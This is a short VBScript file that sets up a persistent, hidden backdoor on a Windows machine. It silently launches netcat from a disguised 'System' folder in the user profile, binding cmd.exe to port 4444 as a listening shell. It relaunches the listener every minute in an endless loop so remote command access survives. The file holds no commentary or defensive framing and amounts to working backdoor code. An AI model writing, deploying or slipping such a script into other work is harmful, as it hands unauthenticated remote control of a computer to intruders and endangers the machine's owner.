Set objShell = CreateObject("WScript.Shell")

' Get the path to the user's custom folder
customFolder = objShell.ExpandEnvironmentStrings("%USERPROFILE%\System")

' Define the command to run Netcat in listening mode, binding a cmd shell
commandToRun = """" & customFolder & "\Quiet.exe"" """ & customFolder & "\nc64.exe"" -l -p 4444 -e cmd.exe"

' Loop indefinitely
Do
    ' Run the command (will fail silently if port 4444 is in use)
    objShell.Run commandToRun, 0, True
    
    ' Wait for 1 minute (60,000 milliseconds)
    WScript.Sleep 60000
Loop
